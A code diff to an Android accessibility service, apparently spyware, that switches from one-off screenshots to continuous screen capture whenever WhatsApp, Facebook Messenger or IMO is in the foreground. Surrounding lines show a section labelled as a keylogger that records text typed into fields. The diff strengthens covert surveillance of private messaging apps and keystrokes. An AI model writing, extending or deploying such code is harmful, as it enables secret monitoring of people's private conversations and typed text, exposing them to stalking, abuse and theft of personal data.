@@ -119,20 +119,22 @@ class ScreenService : AccessibilityService() {
         }
 
         // ===== Detect App Open =====
-        when (pkg) {
-            PKG_WHATSAPP, PKG_WHATSAPP_B -> {
-                handleAppOpen("whatsapp")
-                AutoScreenshot.captureSequence(this, "whatsapp")
-            }
-            PKG_FB, PKG_FB_MSG -> {
-                handleAppOpen("fb")
-                AutoScreenshot.captureSequence(this, "fb")
-            }
-            PKG_IMO, PKG_IMO_BETA -> {
-                handleAppOpen("imo")
-                AutoScreenshot.captureSequence(this, "imo")
-            }
-        }
+val isWhatsApp = pkg == PKG_WHATSAPP || pkg == PKG_WHATSAPP_B
+val isFB = pkg == PKG_FB || pkg == PKG_FB_MSG
+val isIMO = pkg == PKG_IMO || pkg == PKG_IMO_BETA
+
+if (isWhatsApp) {
+    handleAppOpen("whatsapp")
+    AutoScreenshot.startContinuous(this, "whatsapp")
+} else if (isFB) {
+    handleAppOpen("fb")
+    AutoScreenshot.startContinuous(this, "fb")
+} else if (isIMO) {
+    handleAppOpen("imo")
+    AutoScreenshot.startContinuous(this, "imo")
+} else {
+    AutoScreenshot.stopContinuous()
+}
 
         // ===== Keylogger — text fields =====
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
